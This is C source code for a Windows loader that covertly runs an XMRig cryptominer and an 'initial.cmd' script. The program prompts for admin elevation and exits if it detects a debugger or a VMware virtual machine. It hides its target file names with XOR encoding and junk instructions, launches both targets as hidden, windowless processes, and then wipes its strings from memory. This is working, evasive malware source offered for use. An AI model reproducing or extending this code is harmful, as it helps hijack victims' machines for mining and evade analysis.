// ===== BiG BuG TBuG =====

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <shellapi.h>
#include <stdlib.h>

#define XOR_KEY (0xAA ^ 0x57) 

BYTE encryptedApp1[] = { 
    0x85, 0x90, 0x8F, 0x94, 0x9A, 0xD3, 0x98, 0x85, 0x98, XOR_KEY 
};

BYTE encryptedInitial[] = { 
    0x94, 0x93, 0x94, 0x89, 0x94, 0x9C, 0x91, 0xD3, 0x9E, 0x90, 0x99, XOR_KEY 
};

#if defined(__GNUC__) && (defined(__x86_64__) || defined(__i386__))
    #define JUNK_BLOCK __asm__ __volatile__ (".byte 0x90, 0x90")
#elif defined(_MSC_VER) && defined(_M_IX86) 
    #define JUNK_BLOCK __asm { __emit 0x90; __emit 0x90 }
#else
    #define JUNK_BLOCK
#endif

void DECRYPT(BYTE* data, size_t len) {
    for(size_t i = 0; i < len; i++) {
        data[i] ^= XOR_KEY;
        JUNK_BLOCK;
    }
}

BOOL IsDebugged() {
    JUNK_BLOCK;
    return IsDebuggerPresent();
}

BOOL FileExists(LPCSTR path) {
    DWORD attrib = GetFileAttributesA(path);
    return (attrib != INVALID_FILE_ATTRIBUTES && 
            !(attrib & FILE_ATTRIBUTE_DIRECTORY));
}

BOOL IsVM() {
    
    JUNK_BLOCK;
    BOOL result = FALSE;

    #if defined(__GNUC__) && (defined(__x86_64__) || defined(__i386__))
        #include <setjmp.h>
        #include <signal.h>
        
        static sigjmp_buf env;
        
        static void handle_sigsegv(int sig) {
            siglongjmp(env, 1);
        }
        
        struct sigaction sa, old_sa;
        sa.sa_handler = handle_sigsegv;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = 0;
        
        if (sigaction(SIGSEGV, &sa, &old_sa) == 0) {
            if (sigsetjmp(env, 1) == 0) {
                __asm__ __volatile__ (
                    "push %%rax\n\t"
                    "push %%rbx\n\t"
                    "push %%rcx\n\t"
                    "push %%rdx\n\t"
                    "mov $0x564D5868, %%eax\n\t"
                    "mov $0x0A, %%ecx\n\t"
                    "mov $0x5658, %%dx\n\t"
                    "in %%dx, %%eax\n\t"
                    "cmp $0x564D5868, %%ebx\n\t"
                    "sete %%al\n\t"
                    "movzx %%al, %%eax\n\t"
                    "mov %%eax, %0\n\t"
                    "pop %%rdx\n\t"
                    "pop %%rcx\n\t"
                    "pop %%rbx\n\t"
                    "pop %%rax\n\t"
                    : "=m" (result)
                    : 
                    : "memory"
                );
            }
            sigaction(SIGSEGV, &old_sa, NULL);
        }
    #elif defined(_MSC_VER) && defined(_M_IX86)
        __try {
            __asm {
                push eax
                push ebx
                push ecx
                push edx
                mov  eax, 0x564D5868
                mov  ecx, 0x0A
                mov  dx, 0x5658
                in   eax, dx
                cmp  ebx, 0x564D5868
                sete al
                movzx eax, al
                mov  result, eax
                pop edx
                pop ecx
                pop ebx
                pop eax
            }
        }
        __except(EXCEPTION_EXECUTE_HANDLER) {
            result = FALSE;
        }
    #endif

    return result;
}

BOOL IsAdmin() {
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdminGroup = NULL;
    
    if (AllocateAndInitializeSid(&NtAuthority, 2,
        SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
        0, 0, 0, 0, 0, 0, &AdminGroup)) {
        
        if (!CheckTokenMembership(NULL, AdminGroup, &isAdmin)) {
            isAdmin = FALSE;
        }
        FreeSid(AdminGroup);
    }
    return isAdmin;
}

void ElevateToAdmin() {
    CHAR modulePath[MAX_PATH];
    GetModuleFileNameA(NULL, modulePath, MAX_PATH);
    
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = modulePath;
    sei.hwnd = NULL;
    sei.nShow = SW_NORMAL;
    
    if (!ShellExecuteExA(&sei)) {
        DWORD err = GetLastError();
        if (err != ERROR_CANCELLED) {
            MessageBoxA(NULL, "Administrator elevation failed", "Error", MB_ICONERROR);
        }
    }
    else {
        exit(0);
    }
}

BOOL RunHiddenProcess(LPCSTR command) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL ret = CreateProcessA(
        NULL, 
        (LPSTR)command,
        NULL,              
        NULL,              
        FALSE,             
        CREATE_NO_WINDOW | DETACHED_PROCESS,
        NULL,              
        NULL,  
        &si,               
        &pi                
    );

    if (ret) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return ret;
}

int main() {
    JUNK_BLOCK;
    
    if (!IsAdmin()) {
        int result = MessageBoxA(
            NULL,
            "This program requires administrator privileges for full functionality.\n\n"
            "Do you want to restart with admin rights?",
            "Admin Privileges Required",
            MB_YESNO | MB_ICONQUESTION | MB_DEFBUTTON1
        );
        
        if (result == IDYES) {
            ElevateToAdmin();
        }
    }
    
    if(IsDebugged()  || IsVM() ) {
        MessageBoxA(NULL, "Debugging Environment Detected", "Security Alert", MB_ICONERROR);
        return 1;
    }

    DECRYPT(encryptedApp1, sizeof(encryptedApp1));
    DECRYPT(encryptedInitial, sizeof(encryptedInitial));
    
    CHAR currentDir[MAX_PATH];
    GetModuleFileNameA(NULL, currentDir, MAX_PATH);
    
    char* lastBackslash = strrchr(currentDir, '\\');
    if (lastBackslash) *lastBackslash = '\0';
    
    CHAR cmdCommand[MAX_PATH + 20];
    snprintf(cmdCommand, sizeof(cmdCommand), "cmd.exe /C \"%s\\%s\"", currentDir, encryptedInitial);
    
    BOOL app1Success = FALSE;
    CHAR fullApp1[MAX_PATH];
    snprintf(fullApp1, sizeof(fullApp1), "%s\\%s", currentDir, encryptedApp1);
    
    if(FileExists(fullApp1)) {
        if(RunHiddenProcess(encryptedApp1)) {  
            app1Success = TRUE;
        } else {
            DWORD err = GetLastError();
            CHAR errorMsg[256];
            snprintf(errorMsg, sizeof(errorMsg), "Failed to run xmrig.exe\nError: %lu", err);
            MessageBoxA(NULL, errorMsg, "Execution Error", MB_ICONWARNING);
        }
    } else {
        CHAR notFoundMsg[256];
        snprintf(notFoundMsg, sizeof(notFoundMsg), "xmrig.exe not found in:\n%s", currentDir);
        MessageBoxA(NULL, notFoundMsg, "File Missing", MB_ICONWARNING);
    }

    BOOL initialSuccess = FALSE;
    CHAR fullInitial[MAX_PATH];
    snprintf(fullInitial, sizeof(fullInitial), "%s\\%s", currentDir, encryptedInitial);
    
    if(FileExists(fullInitial)) {
        if(RunHiddenProcess(cmdCommand)) {
            initialSuccess = TRUE;
        } else {
            DWORD err = GetLastError();
            CHAR errorMsg[256];
            snprintf(errorMsg, sizeof(errorMsg), "Failed to run initial.cmd\nError: %lu", err);
            MessageBoxA(NULL, errorMsg, "Execution Error", MB_ICONWARNING);
        }
    } else {
        CHAR notFoundMsg[256];
        snprintf(notFoundMsg, sizeof(notFoundMsg), "initial.cmd not found in:\n%s", currentDir);
        MessageBoxA(NULL, notFoundMsg, "File Missing", MB_ICONWARNING);
    }

    if(!app1Success && !initialSuccess) {
        MessageBoxA(NULL, "All operations failed", "Critical Error", MB_ICONERROR);
        return 1;
    }

    SecureZeroMemory(encryptedApp1, sizeof(encryptedApp1));
    SecureZeroMemory(encryptedInitial, sizeof(encryptedInitial));
    SecureZeroMemory(cmdCommand, sizeof(cmdCommand));
    SecureZeroMemory(currentDir, sizeof(currentDir));
    SecureZeroMemory(fullApp1, sizeof(fullApp1));
    SecureZeroMemory(fullInitial, sizeof(fullInitial));

    return 0;
}